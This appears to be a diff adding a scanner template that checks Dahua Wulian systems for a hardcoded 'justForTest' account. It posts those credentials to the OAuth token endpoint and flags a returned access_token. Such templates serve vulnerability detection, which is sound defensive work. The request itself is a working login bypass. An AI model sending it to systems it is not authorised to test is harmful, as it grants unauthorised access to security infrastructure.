@@ -1,0 +1,18 @@
+name: dahua-wulian-justForTest-login
+set:
+  s1: randomInt(1000,9999)
+  s2: randomInt(10000,99999)
+  rboundary: randomInt(800000000, 1000000000)
+groups:
+  rules1:  
+  - method: POST
+    path: /evo-apigw/evo-oauth/oauth/token
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip
+      Connection: close
+    search:
+    followredirects: false
+    body: "username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key="
+    expression: response.status == 200 && response.body.bcontains(b"access_token")
